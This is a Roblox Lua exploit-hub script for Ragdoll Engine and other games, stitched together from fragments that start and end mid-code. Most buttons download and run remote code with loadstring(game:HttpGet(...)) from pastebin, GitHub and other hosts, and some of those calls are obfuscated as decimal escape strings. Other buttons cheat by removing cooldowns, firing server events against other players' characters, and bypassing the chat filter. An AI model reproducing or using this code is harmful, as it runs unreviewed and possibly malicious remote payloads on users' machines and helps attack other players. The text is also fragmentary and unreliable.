local scripts = Instance.new("Frame")
local eee_8 = Instance.new("TextButton")
local eee_9 = Instance.new("TextButton")
local eee_10 = Instance.new("TextButton")
local eee_11 = Instance.new("TextButton")
local eee_12 = Instance.new("TextButton")
local eee_13 = Instance.new("TextButton")
local eee_14 = Instance.new("TextButton")
local gui = Instance.new("Frame")
local eee_15 = Instance.new("TextButton")
local eee_16 = Instance.new("TextButton")
local eee_17 = Instance.new("TextButton")
local eee_18 = Instance.new("TextButton")
local eee_19 = Instance.new("TextButton")
local eee_20 = Instance.new("TextButton")
local eee_21 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
Frame.Position = UDim2.new(0.1996997, 0, 0.198707595, 0)
Frame.Size = UDim2.new(0, 496, 0, 324)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextLabel.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextLabel.Size = UDim2.new(0, 487, 0, 48)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextLabel_2.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextLabel_2.Size = UDim2.new(0, 487, 0, 48)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Ragdoll Engine GUI                                                                           "
TextLabel_2.TextColor3 = Color3.fromRGB(85, 255, 0)
TextLabel_2.TextSize = 25.000

g.Name = "g"
g.Parent = Frame
g.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
g.Position = UDim2.new(0.0451745391, 0, 0.201342285, 0)
g.Size = UDim2.new(0, 121, 0, 48)
g.Font = Enum.Font.SourceSans
g.Text = "GUIS"
g.TextColor3 = Color3.fromRGB(85, 255, 0)
g.TextSize = 25.000

sc.Name = "sc"
sc.Parent = Frame
sc.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
sc.Position = UDim2.new(0.375770003, 0, 0.201342285, 0)
sc.Size = UDim2.new(0, 121, 0, 48)
sc.Font = Enum.Font.SourceSans
sc.Text = "Scripts"
sc.TextColor3 = Color3.fromRGB(85, 255, 0)
sc.TextSize = 25.000

M.Name = "M"
M.Parent = Frame
M.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
M.Position = UDim2.new(0.710733116, 0, 0.201342285, 0)
M.Size = UDim2.new(0, 121, 0, 48)
M.Font = Enum.Font.SourceSans
M.Text = "Misc"
M.TextColor3 = Color3.fromRGB(85, 255, 0)
M.TextSize = 25.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextButton.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextButton.Position = UDim2.new(0.751540065, 0, 0, 0)
TextButton.Size = UDim2.new(0, 121, 0, 48)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Enjoy!"
TextButton.TextColor3 = Color3.fromRGB(85, 255, 0)
TextButton.TextSize = 30.000

extra.Name = "extra"
extra.Parent = Frame
extra.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
extra.BackgroundTransparency = 3.000
extra.BorderColor3 = Color3.fromRGB(85, 255, 0)
extra.Position = UDim2.new(0, 0, 0.399328858, 0)
extra.Size = UDim2.new(0, 487, 0, 179)

eee.Name = "eee"
eee.Parent = extra
eee.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee.Size = UDim2.new(0, 144, 0, 52)
eee.Font = Enum.Font.SourceSans
eee.Text = "Click Invisible"
eee.TextColor3 = Color3.fromRGB(85, 255, 0)
eee.TextSize = 25.000
eee.MouseButton1Down:connect(function()
	a=game.Players:FindFirstChild("OddPotion",true)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local backpack = localPlayer:WaitForChild("Backpack")

	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Parent = backpack
	tool.Name = "Invisible Object"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if mouse.Target and mouse.Target.Parent then
				a.TransEvent:FireServer(mouse.Target,1)
			end
		end)
	end)
	a=game.Players:FindFirstChild("OddPotion",true)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local backpack = localPlayer:WaitForChild("Backpack")

	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Parent = backpack
	tool.Name = "Visible Object"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if mouse.Target and mouse.Target.Parent then
				a.TransEvent:FireServer(mouse.Target,0)
			end
		end)
	end)
end)

eee_2.Name = "eee"
eee_2.Parent = extra
eee_2.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_2.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_2.Size = UDim2.new(0, 144, 0, 52)
eee_2.Font = Enum.Font.SourceSans
eee_2.Text = "Dex"
eee_2.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_2.TextSize = 25.000
eee_2.MouseButton1Down:connect(function()
	loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
end)


eee_3.Name = "eee"
eee_3.Parent = extra
eee_3.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_3.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_3.Size = UDim2.new(0, 144, 0, 52)
eee_3.Font = Enum.Font.SourceSans
eee_3.Text = "Lime X Discord"
eee_3.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_3.TextSize = 20.000
eee_8.MouseButton1Down:connect(function()
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Discord Invite";
	Text = "The Discord invite has been copied!";
})
setclipboard ("https://discord.gg/5z9PZqbFnX")

end)

eee_4.Name = "eee"
eee_4.Parent = extra
eee_4.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_4.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_4.Size = UDim2.new(0, 144, 0, 52)
eee_4.Font = Enum.Font.SourceSans
eee_4.Text = "No Ragdoll"
eee_4.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_4.TextSize = 25.000
eee_4.MouseButton1Down:connect(function()
	local player = game:GetService("Players").LocalPlayer
	local rag = player.Character:FindFirstChild("Local Ragdoll")
	rag:Remove()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X ";
		Text = "You can no longer ragdoll!";
	})
end)


eee_5.Name = "eee"
eee_5.Parent = extra
eee_5.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_5.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_5.Size = UDim2.new(0, 144, 0, 52)
eee_5.Font = Enum.Font.SourceSans
eee_5.Text = "No Cooldown"
eee_5.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_5.TextSize = 25.000
eee_5.MouseButton1Down:connect(function()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X No Cooldown";
		Text = "You can now bomb and push whenever you like!";
	})	
	
	game.Players.LocalPlayer.Backpack.ImpulseGrenade.Configuration.Cooldown.Value = 0	
	game.Players.LocalPlayer.Backpack.Push.Configuration.Cooldown.Value = 0
end)

eee_6.Name = "eee"
eee_6.Parent = extra
eee_6.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_6.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_6.Size = UDim2.new(0, 144, 0, 52)
eee_6.Font = Enum.Font.SourceSans
eee_6.Text = "Trash Free Push"
eee_6.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_6.TextSize = 24.000
eee_6.MouseButton1Down:connect(function()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X Free Push";
		Text = "You're Game Might freeze when you push!";
	})
	loadstring(game:HttpGet("https://pastebin.com/raw/99zNVNHr", true))()

end)


eee_7.Name = "eee"
eee_7.Parent = extra
eee_7.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_7.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_7.Size = UDim2.new(0, 463, 0, 52)
eee_7.Font = Enum.Font.SourceSans
eee_7.Text = "Destroy GUI ):"
eee_7.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_7.TextSize = 30.000
eee_7.MouseButton1Down:connect(function()
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "Press P To Toggle / Untoggle the gui!";
})
end)

scripts.Name = "scripts"
scripts.Parent = Frame
scripts.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
scripts.BackgroundTransparency = 3.000
scripts.BorderColor3 = Color3.fromRGB(85, 255, 0)
scripts.Position = UDim2.new(0, 0, 0.399328858, 0)
scripts.Size = UDim2.new(0, 487, 0, 179)

eee_8.Name = "eee"
eee_8.Parent = scripts
eee_8.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_8.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee_8.Size = UDim2.new(0, 144, 0, 52)
eee_8.Font = Enum.Font.SourceSans
eee_8.Text = "Fps Booster"
eee_8.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_8.TextSize = 25.000
eee_8.MouseButton1Down:connect(function()
	local a = game
	local b = a.Workspace
	local c = a.Lighting
	local d = b.Terrain
	d.WaterWaveSize = 0
	d.WaterWaveSpeed = 0
	d.WaterReflectance = 0
	d.WaterTransparency = 0
	c.GlobalShadows = false
	c.FogEnd = 9e9
	c.Brightness = 0
	settings().Rendering.QualityLevel = "Level01"
	for e, f in pairs(a:GetDescendants()) do
		if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
			f.Material = "Plastic"
			f.Reflectance = 0
		elseif f:IsA("Decal") or f:IsA("Texture") then
			f.Transparency = 0
		elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
			f.Lifetime = NumberRange.new(0)
		elseif f:IsA("Explosion") then
			f.BlastPressure = 0
			f.BlastRadius = 0
		elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
			f.Enabled = false
		elseif f:IsA("MeshPart") then
			f.Material = "Plastic"
			f.Reflectance = 0
			f.TextureID = 10385902758728957
		end
	end
	for e, g in pairs(c:GetChildren()) do
		if
			g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
				g:IsA("DepthOfFieldEffect")
		then
			g.Enabled = false
		end
	end
	sethiddenproperty(game.Lighting, "Technology", "Compatibility")
end)


eee_9.Name = "eee"
eee_9.Parent = scripts
eee_9.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_9.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_9.Size = UDim2.new(0, 144, 0, 52)
eee_9.Font = Enum.Font.SourceSans
eee_9.Text = "CMD X"
eee_9.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_9.TextSize = 25.000
eee_9.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/F3JvpCDM",true))()
end)

eee_10.Name = "eee"
eee_10.Parent = scripts
eee_10.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_10.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_10.Size = UDim2.new(0, 144, 0, 52)
eee_10.Font = Enum.Font.SourceSans
eee_10.Text = "IY"
eee_10.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_10.TextSize = 25.000
eee_10.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)


eee_11.Name = "eee"
eee_11.Parent = scripts
eee_11.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_11.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_11.Size = UDim2.new(0, 144, 0, 52)
eee_11.Font = Enum.Font.SourceSans
eee_11.Text = "Good Graphics"
eee_11.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_11.TextSize = 25.000
eee_11.MouseButton1Down:connect(function()
	_G.BlurSize = 3

	_G.ColorCorrectionBrightness = 0.03
	_G.ColorCorrectionContrast = 0.3
	_G.ColorCorrectionSaturation = 0.01
	_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)

	_G.SunRaysIntensity = 0.2
	_G.SunRaysSpread = 1

	-- Lighting settings:
	_G.GlobalShadows = true
	_G.Brightness = 0.9
	_G.GeographicLatitude = 350
	_G.TimeOfDay = 17
	_G.ExposureCompensation = 0.03


	spawn(function()
		loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
	end)
end)


eee_12.Name = "eee"
eee_12.Parent = scripts
eee_12.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_12.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_12.Size = UDim2.new(0, 144, 0, 52)
eee_12.Font = Enum.Font.SourceSans
eee_12.Text = "Chat Bypass"
eee_12.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_12.TextSize = 25.000
eee_12.MouseButton1Down:connect(function()
	local function callback(Text)
		if Text == "Swear Word GUI" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
		elseif Text == ("Custom") then
			loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
		end
	end


	local NotificationBindable = Instance.new("BindableFunction")
	NotificationBindable.OnInvoke = callback
	--
	game.StarterGui:SetCore("SendNotification",  {
		Title = "Witch version would you like";
		Text = "Please Choose";
		Icon = "";
		Duration = 10;
		Button1 = "Swear Word GUI";
		Button2 = "Custom";
		Callback = NotificationBindable;
	})
end)



eee_13.Name = "eee"
eee_13.Parent = scripts
eee_13.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_13.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_13.Size = UDim2.new(0, 144, 0, 52)
eee_13.Font = Enum.Font.SourceSans
eee_13.Text = "Bang Script"
eee_13.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_13.TextSize = 25.000
eee_13.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/6Uy22Jfs", true))()
end)



eee_14.Name = "eee"
eee_14.Parent = scripts
eee_14.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_14.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_14.Size = UDim2.new(0, 463, 0, 52)
eee_14.Font = Enum.Font.SourceSans
eee_14.Text = "FE Headless!"
eee_14.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_14.TextSize = 50.000
eee_14.MouseButton1Down:connect(function()
	local tool
	local player = game.Players.LocalPlayer.Character.Name
	for i,v in pairs (game.Players:GetPlayers()) do
		tool = v.Backpack:FindFirstChild'OddPotion' or v.Character:FindFirstChild'OddPotion'
		if tool then break end
	end

	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.Name == "Head" and v:GetChildren() then
			tool.TransEvent:FireServer(v,1)
		end
	end
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if v.Name == "face" then
			tool.TransEvent:FireServer(v,1)
		end
	end
end)

gui.Name = "gui"
gui.Parent = Frame
gui.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
gui.BackgroundTransparency = 3.000
gui.BorderColor3 = Color3.fromRGB(85, 255, 0)
gui.Position = UDim2.new(0, 0, 0.399328858, 0)
gui.Size = UDim2.new(0, 487, 0, 179)

eee_15.Name = "eee"
eee_15.Parent = gui
eee_15.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_15.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee_15.Size = UDim2.new(0, 144, 0, 52)
eee_15.Font = Enum.Font.SourceSans
eee_15.Text = "Alpha X "
eee_15.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_15.TextSize = 25.000
eee_15.MouseButton1Down:connect(function()

end)


eee_16.Name = "eee"
eee_16.Parent = gui
eee_16.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_16.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_16.Size = UDim2.new(0, 144, 0, 52)
eee_16.Font = Enum.Font.SourceSans
eee_16.Text = "GUI 2"
eee_16.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_16.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/MeAL9tUE", true))()
end)
eee_16.TextSize = 25.000

eee_17.Name = "eee"
eee_17.Parent = gui
eee_17.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_17.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_17.Size = UDim2.new(0, 144, 0, 52)
eee_17.Font = Enum.Font.SourceSans
eee_17.Text = "GUI 1"
eee_17.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_17.TextSize = 25.000
eee_17.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/RagdollEngineGUI.lua'),true))()
end)

eee_18.Name = "eee"
eee_18.Parent = gui
eee_18.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_18.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_18.Size = UDim2.new(0, 144, 0, 52)
eee_18.Font = Enum.Font.SourceSans
eee_18.Text = "Free Push"
eee_18.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_18.TextSize = 25.000
eee_18.MouseButton1Down:connect(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "Go Near Someone too push!";
})

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "This May Lag a little!";
})

	local lp = game:GetService("Players").LocalPlayer

	spawn(function()
		while wait(0.05) do
			pcall(function()
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					local PlayerPos = lp.Character.HumanoidRootPart.Position
					local Range = (PlayerPos - v.Character.HumanoidRootPart.Position).magnitude
					if v ~= lp and v.Backpack:FindFirstChild("Push") and Range > 100 then
						v.Backpack.Push.PushEvent:FireServer()
					end
				end
			end)
		end
	end)

	lp.Character.Humanoid.WalkSpeed = 100
	lp.Character.Humanoid.JumpPower = 100

	lp.Character["Local Ragdoll"]:Destroy()
	lp.Character.Controls:Destroy()
	lp.Character["State Handler"]:Destroy()
	lp.Character.LocalScript:Destroy()
end)


eee_19.Name = "eee"
eee_19.Parent = gui
eee_19.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_19.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_19.Size = UDim2.new(0, 144, 0, 52)
eee_19.Font = Enum.Font.SourceSans
eee_19.Text = "Bruh Hub"
eee_19.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_19.TextSize = 25.000
eee_19.MouseButton1Down:connect(function()
	------Supports Ragdoll Engine , Shinobi Life , And Phantom Forces
	loadstring(game:HttpGet("https://bruh.keshhub.com/main.lua"))()

end)



eee_20.Name = "eee"
eee_20.Parent = gui
eee_20.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_20.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_20.Size = UDim2.new(0, 144, 0, 52)
eee_20.Font = Enum.Font.SourceSans
eee_20.Text = "Vynixu"
eee_20.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_20.TextSize = 25.000
eee_20.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Ragdoll%20Engine%20Loader"))()

end)


eee_21.Name = "eee"
eee_21.Parent = gui
eee_21.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_21.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_21.Size = UDim2.new(0, 463, 0, 52)
eee_21.Font = Enum.Font.SourceSans
eee_21.Text = "Script for trash exploits "
eee_21.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_21.TextSize = 30.000
eee_21.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/s2VeV6AY"))()
end)

-- Scripts:

local function UEYJUB_fake_script() -- g.LocalScript 
	local script = Instance.new('LocalScript', g)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = true
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(UEYJUB_fake_script)()
local function HUYD_fake_script() -- sc.LocalScript 
	local script = Instance.new('LocalScript', sc)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = true
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(HUYD_fake_script)()
local function ODQL_fake_script() -- sc.LocalScript 
	local script = Instance.new('LocalScript', sc)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = true
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(ODQL_fake_script)()
local function UALHIR_fake_script() -- M.LocalScript 
	local script = Instance.new('LocalScript', M)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = true
	end)
end
coroutine.wrap(UALHIR_fake_script)()
local function PCTD_fake_script() -- M.LocalScript 
	local script = Instance.new('LocalScript', M)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = true
	end)
end
coroutine.wrap(PCTD_fake_script)()
local function HFGVJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	while true do
		script.Parent.TextColor3 = Color3.new (255, 176, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (0, 255, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (255, 0, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (170, 85, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (106, 57, 9)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (0, 16, 176)
		wait(.1)
	end
end
coroutine.wrap(HFGVJ_fake_script)()




--------------------------------------------togglekey


---------------this is toggle gui script 
local function MLNJ_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local frame = script.Parent -- path to the frame
	local mouse = game:GetService('Players').LocalPlayer:GetMouse(); -- we need the mouse object, which also has the keyboard

	mouse.KeyDown:connect(function(key) -- whenever a key is pushed down
		key = key:lower() -- i do this in all my key events, though i don't remember why
		if key == 'p' then -- if key pressed is h
			frame.Visible = not frame.Visible -- flip between visible/invisible
		end
	end)
end
coroutine.wrap(MLNJ_fake_script)()
end)

Section:NewButton("Ragdoll Gui 4 ", "", function()
loadstring(game:HttpGet('https://gist.githubusercontent.com/H20CalibreYT/462f6e6236a9371130f113def6549bb1/raw/'))()
end)




local Section = Tab:NewSection("Survival The Killer")
Section:NewButton("SurvivalTheKiller GUI 1 ", " Killer GUI", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Kiroftt/Survive-The-Killer/main/Simple'))();
end)
Section:NewButton("SurvivalTheKiller GUI 2 ", " Killer GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FOXTROXHACKS/ElToro/main/Hub.lua"))()
end)


Section:NewButton("SurvivalTheKiller GUI 1 ", " Killer GUI", function()
   local games = { ["SurviveTheKiller"] = 4580204640 } for i,v in pairs(games) do if game.PlaceId == v then print("Supported!"); loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/Games/" .. i .. ".lua"))() end end loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/dcJoin.lua"))()
end)




local Section = Tab:NewSection("Pop It Trading")
Section:NewButton("Pop It Trading 1 ", "Pop It Kids", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/domdaobfuscater/09214a11b8a30bab47ceff281116195f/raw/40356a0ff4542a51283ab5de0a642233a6ceb6f9/gistfile1.txt"))()
end)
Section:NewButton("Pop It Trading 2 ", "Pop It Kids", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Uhhh1230/Pop-It-Trading/main/E"))()
end)
Section:NewButton("Pop It Trading 3 [Key] ", "Key: w5dijLknm*j", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuasCoder/Rayfield/main/NewScript"))()
end)

Section:NewButton("Pop It Trading 1 ", "Pop It Kids", function()
       loadstring(game:HttpGet(("https://thekillerhood.xyz/cracked/CRACKEDBYKILLERHOOD"),true))()
end)

Section:NewButton("Pop It Trading 2 ", "Pop It Kids", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pov",true))()
end)

Section:NewButton("Pop It Trading 3 ", "Pop It Kids", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pov%20v2"))()
end)

Section:NewButton("Pop it Trading 4 ", "Pop it Kids", function()
       --update 1.2
loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pov",true))()
end)



local Section = Tab:NewSection("Natural Disaster")
Section:NewButton("Natural Disaster 1 ", "New GUI OP", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua'),true))()
end)
Section:NewButton("Natural Disaster 2 ", "New GUI OP", function()
loadstring(game:HttpGet('https://onemorehub.weinzspace.com/'))()
end)
Section:NewButton("Natural Disaster 3 ", "New GUI OP", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/Loader/main/Loader.lua"))()
end)

Section:NewButton("Natural Disaster 1 ", "New GUI OP", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
end)

Section:NewButton("Natural Disaster 2 ", "Has More Script", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()
--Made By 1kWoof#0143
end)

Section:NewButton("Natural Disaster 3 ", "New and op", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\105\100\50\88\104\119\81\68\39\41\41\40\41\10")()
end)

Section:NewButton("Natural Disaster Gui 4 ", "Cool", function()
loadstring("\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\116\97\114\116\101\114\71\117\105\34\41\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\123\10\84\105\116\108\101\32\61\32\34\73\109\32\80\97\116\114\105\99\107\34\44\10\84\101\120\116\32\61\32\34\76\111\97\100\105\110\103\46\46\34\44\32\10\32\10\32\10\66\117\116\116\111\110\49\32\61\32\34\79\107\34\44\10\68\117\114\97\116\105\111\110\32\61\32\51\48\32\10\125\41\10\119\97\105\116\40\50\41\10\10\108\111\99\97\108\32\76\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\118\102\102\49\98\81\57\70\34\41\41\40\41\10\10\108\111\99\97\108\32\87\105\110\100\111\119\32\61\32\76\105\98\114\97\114\121\46\67\114\101\97\116\101\76\105\98\40\34\78\97\116\117\114\97\108\32\68\105\115\97\115\116\101\114\32\71\117\105\34\44\32\34\79\99\101\97\110\34\41\10\10\108\111\99\97\108\32\84\97\98\49\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\83\99\114\105\112\116\34\41\10\108\111\99\97\108\32\84\97\98\49\83\101\99\116\105\111\110\32\61\32\84\97\98\49\58\78\101\119\83\101\99\116\105\111\110\40\34\83\99\114\105\112\116\34\41\10\10\108\111\99\97\108\32\84\97\98\50\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\84\101\108\101\112\111\114\116\34\41\10\108\111\99\97\108\32\84\97\98\50\83\101\99\116\105\111\110\32\61\32\84\97\98\50\58\78\101\119\83\101\99\116\105\111\110\40\34\84\101\108\101\112\111\114\116\34\41\10\10\108\111\99\97\108\32\84\97\98\51\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\66\121\112\97\115\115\34\41\10\108\111\99\97\108\32\84\97\98\51\83\101\99\116\105\111\110\32\61\32\84\97\98\51\58\78\101\119\83\101\99\116\105\111\110\40\34\66\121\112\97\115\115\34\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\71\101\116\32\66\97\108\108\111\110\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\105\102\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\71\114\101\101\110\66\97\108\108\111\111\110\34\44\32\116\